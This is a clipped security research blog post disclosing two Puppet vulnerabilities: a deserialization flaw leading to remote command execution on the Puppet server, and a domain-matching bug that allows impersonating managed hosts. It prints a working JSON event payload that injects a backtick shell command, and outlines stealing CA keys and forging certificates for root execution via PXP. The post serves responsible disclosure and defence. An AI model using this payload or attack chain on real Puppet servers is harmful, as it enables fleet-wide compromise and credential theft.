---
title: Pulling the right strings for RCE on a Puppet
source: https://neodyme.io/en/blog/puppet_rce/
source_host: neodyme.io
clip_date: 2026-11-04T05:31:54+08:00
trace_id: e79a3a79-39a5-49b9-a4cc-ba29cefc609e
content_hash: b0065bd6d2d1834ba09c1ffb663a3f0acf02f0ee8685cf82e0979bf14a58d6dd
status: synced
tags:
  - 漏洞分析
  - 内网渗透
series: null
feed_source: Neodyme
ai_summary: TL;DR：Puppet 默认配置下存在两个 CVSS 9+ 漏洞——事件反序列化可致服务器 RCE，域名匹配截断缺陷可冒充任意受管主机。
ai_summary_style: key-points
images_status:
  total: 0
  succeeded: 0
  failed_urls: []
notion_page_id: 40d75244-d011-8133-a313-e728c998e71c
ioc: null
---

> 💡 **AI 总结（key-points）**
>
> TL;DR：Puppet 默认配置下存在两个 CVSS 9+ 漏洞——事件反序列化可致服务器 RCE，域名匹配截断缺陷可冒充任意受管主机。
> 
> - **RCE 利用链：** 通过 `/puppet/v3/report` 端点 JSON 事件中的攻击者可控 `__ptype`，触发 `RubyGenerator` 动态生成类并调用 `class_eval`，借助 Ruby 反引号在定义时执行系统命令，获得 Puppet 服务器上 puppet 用户权限。
> - **认证门槛与影响：** 漏洞需有效客户端证书，但企业环境常开启 `autosign` 允许自助注册；拿到服务器 RCE 后可窃取 CA 私钥伪造证书，在 Puppet Enterprise 中经 PXP（8142 端口 websocket broker）对受管主机下发任务实现 root 执行。
> - **主机冒充漏洞：** trapperkeeper（Clojure）中 `match-domain?` 比较按点拆分的域名列表时截断到较短一方，导致 `evil.target.lab.local` 的证书可通过 `target.lab.local` 的认证。
> - **冒充危害：** 可读取目标主机 catalog（实测含 PostgreSQL 凭据与管理 API token）、伪造 facts、写入 exported resources 在跨节点协调时波及其他主机，并自由调用 Puppet API。
> - **修复情况：** 漏洞影响最新 Puppet Enterprise 2025.11.2（Puppet 8.20.0）及 2021 年 7 月的开源版 6.24.0，OpenVox 于 2026 年 11 月 3 日随 GHSA 公告发布修复；两个漏洞均由 AI 辅助分析发现但依赖研究者精确引导。

Authored by:

## TL;DR

In preparation for a red team engagement we found two critical CVSS 9+ vulnerabilities in Puppet, dating back to 2021. They allow RCE on the puppet management server in a default configuration. Additionally, we discovered a Puppet host impersonation vulnerability in a non-default but commonly used configuration. Both vulnerabilities were responsibly disclosed to the vendors, who has since addressed them in newer versions of Puppet.

## Introduction

[Puppet](https://en.wikipedia.org/wiki/Puppet_\(software\)) is a software configuration management software widely used in big companies to provision software and patch servers. It uses a client- (“agent”) and server-based architecture, where the agent pulls the desired software and configuration state from the server. The software packages are described in a declarative language, while the software stack runs mainly on Ruby.

The software was open source until mid 2025, but changed the licensing as result of the acquisition by Perforce in 2022. Some open-source forks like [OpenVox](https://voxpupuli.org/openvox/) still exist and are maintained by a community. Perforce is now providing “Puppet Enterprise” for companies.

When preparing for a recent red team engagement, we took a look at “Puppet Enterprise”, which is included in a RedHat subscription trial. The goal was to compromise the Puppet Server using only a regular Puppet Client with a valid client certificate for a single Puppet Agent. While we used AI-based analysis to discover the bugs, strict steering of the agents and explicit prompting was necessary to unveil them.

Unknowing what environment and software versions were waiting for us, we targeted the latest `Puppet Enterprise 2025.11.2 primary server`, which uses `Puppet 8.20.0` as Puppet Core Engine. However, the exploits also work for the open-source version `6.24.0`, which dates back to July 2021! After the engagement, both of the vulnerabilities below were reported to Perforce and OpenVox. They cooperated for the patch release dates.

## Vulnerability 1: RCE on the Puppet Server

We applied a fairly known strategy to find bugs in the server: Take a look at data ingestion and parsers. Puppet agents push their state and other interactions to the puppet server API on port `8140`. Agents interacting with the most interesting endpoints `/puppet/v3/[...]` must use TLS with client authentication in order to satisfy some ACL checks and let the puppet server derive the agents’ identity. Also, the current environment has to be specified with `?environment=production`, as the Puppet Server might manage different environments for testing purposes.

One API endpoint receives so-called `events` on the endpoint `/puppet/v3/report/{agent_name}?environment={env}`. More concretely, it receives a JSON-serialized `event` object that lands in the `Puppet::Pops::Serialization::FromDataConverter.convert` method in `transaction/event.rb`:

```ruby
def initialize_from_hash(data)
  data = Puppet::Pops::Serialization::FromDataConverter.convert(data, {
      :allow_unresolved => true,
      :loader => Puppet::Pops::Loaders.static_loader
})
```

Investigating the deserialization path yields the logic in `pops/serialization/from_data_converter.rb`:

```ruby
def initialize(options = EMPTY_HASH)
@pcore_type_procs.default = proc do |hash, type_value|
   # [...]
   else
     type = Types::TypeParser.singleton.parse(type_value, @loader)
     if type.is_a?(Types::PTypeReferenceType)
       unless @allow_unresolved
         raise SerializationError, _('No implementation mapping found for Puppet Type %{type_name}') % { type_name: type_value }
       end

      hash
    else
      # not a string
      pcore_type_hash_to_value(type, value)
    end
  end
```

The deserializer checks the presence of `__ptype` and feeds it into `pcore_type_hash_to_value`. If the result is a `String`, the `build` function is invoked with an attacker-controlled `pcore_type` and value in `[1]`:

```ruby
def pcore_type_hash_to_value(pcore_type, value)
  case value
  when Hash
    # Complex object
    if value.empty?
      build(pcore_type.create)
    elsif pcore_type.implementation_class.respond_to?(:_pcore_init_from_hash)
      build_object(ObjectHashBuilder.new(pcore_type.allocate)) { value.each_pair { |key, elem| with(key) { convert(elem) } } }
    else
      build_object(ObjectArrayBuilder.new(pcore_type.allocate)) { value.each_pair { |key, elem| with(key) { convert(elem) } } }
    end
    when String
      build(pcore_type.create(value)) # [1]
    else
      raise SerializationError, _('Cannot create a %{type_name} from a %{arg_class}') %
                                { :type_name => pcore_type.name, :arg_class => value.class.name }
    end
```

Following the `build` call in the Ruby sources, we can find `pops/types/p_object_type.rb`:

```ruby
def create(*args)
  implementation_class.create(*args)
end
```

The actual implementation looks up the class registry in `[2]`. If the type has not been registered yet, a `RubyGenerator` is used to create an instance of the provided type in `[3]`.

```ruby
def implementation_class(create = true)
  if @implementation_class.nil? && create
    ir = Loaders.implementation_registry
    class_name = ir.nil? ? nil : ir.module_name_for_type(self) # [2]
    if class_name.nil?
      # Use generator to create a default implementation
      @implementation_class = RubyGenerator.new.create_class(self) # [3]
      @implementation_class.class_eval(&@implementation_override) if instance_variable_defined?(:@implementation_override)
```

From here, we are only one step away from direct code execution in Ruby: The `RubyGenerator` at `types/ruby_generator.rb` creates a `class_body` from the provided user input and eventually calls the RCE sink: `cls.class_eval`.

```ruby
def create_class(obj)
  @dynamic_classes ||= Hash.new do |hash, key|
    cls = key.implementation_class(false)
    if cls.nil?
      # ...
      class_def = ''.dup
      class_body(key, EMPTY_ARRAY, class_def)
      cls = Class.new(parent_class)
      cls.class_eval(class_def)                 # Winner Winner Chicken Dinner
```

However, that is just the case if `class_body` uses attacker-controlled input. Let’s see and follow up in `types/ruby_generator.rb` and the `class_body` method:

```ruby
def class_body(obj, segments, bld)
  # Output function placeholders
  obj.functions(false).each_value do |func|
    code_annotation = RubyMethod.annotate(func)
    if code_annotation
      body = code_annotation.body
      params = code_annotation.parameters
      bld << "\n  def " << rname(func.name)
      unless params.nil? || params.empty?
        bld << '(' << params << ')'
      end
      bld << "\n    " << body << "\n"
    else
      bld << "\n  def " << rname(func.name) << "(*args)\n"
      bld << "    # Placeholder for #{func.type}\n"
      bld << "    raise Puppet::Error, \"no method is implemented for #{func.label}\"\n"
    end
    bld << "  end\n"
  end
```

Since we control the `RubyMethod` object, we can freely place a `body` in the class, which will get evaluated!

One might ask: How will `class_eval` give code execution? The class is invoked nowhere. Can only a definition already be harmful? Fair question, and Ruby is tricky about this: A `backtick` (\`) can be used to evaluate system commands, similar to the known backtick trick in modern shells like `bash`. However, we must first close the function body, insert our backticks and re-open a function body block again. The resulting evaluated code looks like:

```ruby
def pwn
  1
end
`id`          # Execution of `id` command at eval / compile time
def d2
  1
end
```

Let’s plug those parts together and craft a JSON event with all the required objects, ptypes and annotations:

```json
"events": [
  {
    "__ptype": "Object[{name => PEP, functions => {test => {type => Callable, annotations => {RubyMethod => {body => \"1\\n  end\\n  `/bin/sh -c touch /tmp/pwned`\\n  def d2\\n    1\"}}}}}]",
    "__pvalue": "x"
  }
]
```

Voilà, we got remote command execution as the `puppet` user on the central Puppet server! Strictly speaking, this vulnerability is rated as “authenticated”, since it needs a valid Puppet agent client certificate. However, most large companies have `autosign` enabled, which provisioning engines like Satellite or Ansible may use to enroll the new host to the Puppet Server. An attacker can thus often use the enrollment endpoint to get a Puppet client certificate without authentication or manual approval.

We have not yet discussed the impact of this RCE, triggered solely from Puppet agent client certificate. The impact highly depends on the Puppet server configuration and the orchestration protocols used, if any are enabled at all.

1.  In environments **not following best practices**, the `puppet` user might be able to tamper with the catalog, enabling RCE on other Puppet managed hosts upon the next check in. In hardened environments, the Puppet catalog is owned by a different user and thus can’t be overwritten.
2.  An attacker might facilitate the `PXP (Puppet Execution Protocol)` feature (Puppet Enterprise only) to get root command execution on Puppet managed hosts. In the case of OpenVox, the `Choria` orchestration protocol might be used to trigger pre-defined and strictly limited tasks, given that the `Choria` protocol is configured at all.

Independent of the configuration, an attacker with RCE on a Puppet server can grab the CA signing keys and impersonate other hosts.

In our lab, we wrote a proof-of-concept for the PXP route supported on Puppet Enterprise: For this, we exfiltrated the private signing keys of the CA and minted a certificate of the Puppet server, specifying `serverAuth` and `clientAuth` in the EKU (Extended Key Usage). This allowed us to communicate with a websocket broker on port `8142`, stage a task and push it to an agent, receiving the `stdout` in return.

The steps shown in the video below are:

1.  Decode the `base64` payload that we will trigger via the RCE. This will copy the CA private key to a Puppet bucket we can then fetch
2.  Trigger the RCE to copy the CA key into the bucket
3.  Fetch the bucket and write CA key to `ca_key.pem`
4.  Mint a `evil.<puppet-server>` certificate offline with the CA keys
5.  Trigger the PXP RCE on the `<puppet-server>` and show code execution as `root`

## Vulnerability 2: Puppet Host Impersonation

In the RCE bug we briefly touched on the `autosign` feature of puppet: This allows agents to self-enroll if the hostname matches a configured domain format like `*.lab.local`. In enterprise deployments this is often used in initial VM provisioning scripts via Ansible or Satellite. The `autosign` and the CA explicitly checks if the host certificate was already issued for the requested host. This prevents attackers from simply requesting another certificate for the same host, which would allow impersonation.

The bug we found allowed exactly this: Arbitrary impersonation of hosts. But let’s look at the impact side first, assuming impersonation was possible. With the client certificate of another Puppet agent, an attacker can

1.  Grab the Puppet catalog of this specific host
2.  Push “facts” to the Puppet server, spoofing software version numbers and logs
3.  Potentially add so-called *exported resources* to the database, which might impact other hosts in cross-node coordination scenarios. This leads to compromise when exported resources are then realized on a different host
4.  Interact with the Puppet API in general

At first glance, it either depends on the cross-node coordination feature or it just doesn’t look overly dangerous. However, a Puppet catalog often carries more than just software packages. In our engagement, we observed (and later attacked) a specific host that got served a **configuration file** including PostgreSQL credentials, admin API tokens and logins for this specific software.

The Puppet catalog for one specific host can be obtained by sending a `GET` request to the `catalog` endpoint, authenticating via the Puppet agent client certificate:

```plaintext
GET /puppet/v3/catalog/<hostname>?environment=<puppet_env> [...]
```

So, let’s look at the actual bug, which is part of the `trapperkeeper` package written in Clojure. Clojure is a functional programming language, running on a JVM (Java) stack. The following check is used to allow or deny a host via a provided `hostname` and an allowed value to compare.

```clojure
(schema/defn ^:private match-domain? :- schema/Bool
  "Checks that name matches the given ace"
  [{:keys [value match]} :- ACE
   to-match :- schema/Str]
  (let [match-split-domain (split-domain to-match)]
    (if (= :regex match)
      (boolean (re-find (re-pattern value) to-match))
      (every? (fn [[a b]] (= a b)) (map vector value match-split-domain)))))
```

The `match-split-domain` simply takes an FQDN, splits it at the dots and reverses the list before returning it:

```clojure
;; splits "target.lab.local" -> ("local" "lab" "target")
(schema/defn ^:private split-domain :- [schema/Str]
  "Given a domain string, split it on '.' and reverse it. For examples,
  'sylvia.plath.net' becomes ('net' 'plath' 'sylvia'). This is used for domain
  matching."
  [domain :- schema/Str]
  (-> domain
      (string/lower-case)
      (string/split #"\.")
      reverse))
```

The issue is subtle: The `match-domain` method, which compares the two hostnames, truncates the comparison to the **shorter** of both lists. As example:

```plaintext
allow:       ["local", "lab, "target"]
certname:    ["local", "lab", "target", "evil"]
```

An attacker who got a cert for `evil.target.lab.local` can thus authenticate as `target.lab.local`!

As already established above, the `autosign` feature often allows enrollment of certs with the pattern `*.lab.local`. While enrollment of another `target.lab.local` certificate is not possible, an attacker can just use the non-existent host `evil.target.lab.local`, which will work for authentication as well.

## Disclosure

Following initial contact with `OpenVox` and Perforce, both projects were provided with the full technical details of the vulnerabilities.

`OpenVox` quickly acknowledged the findings and issued fixes alongside a GHSA. Release coordination was handled between both projects, with `OpenVox` pushing for an earlier disclosure date.

The fixes were eventually released on November 3, 2026, at 17:00 UTC, accompanied by public security advisories from OpenVox:

-   [GHSA-ffr6-rwpm-p5wq - Authenticated RCE on Puppet server via Event Deserialization](https://github.com/OpenVoxProject/openvox/security/advisories/GHSA-ffr6-rwpm-p5wq)
-   [GHSA-q4hm-33rc-572g - Flawed Hostname Check allows Puppet Client Impersonation](https://github.com/OpenVoxProject/trapperkeeper-authorization/security/advisories/GHSA-q4hm-33rc-572g)

We appreciate the fast response and the transparency throughout the disclosure process!

## Closing Words

Puppet is a powerful software, often with full access to a fleet of systems in a corporate network. Remote Code Execution on such a central and important system can lead to worst-case scenarios: Deployment of ransomware, mass data exfiltration and potentially lateral movement to other parts of the network. But even with the two critical bugs highlighted in this post, an environment hardened according to the best practices will mitigate direct impact significantly.

While both of the bugs above were found with AI assistance, the prompting effort and precise steering of the AI was crucial to the success. With AI rapidly accelerating security research, unguided AI prompting keeps bringing up the same and already covered attack surface, unless steered by experienced researchers with broad knowledge.

If you are also in need of such deep technical analysis of your applications, contact us!

Share:
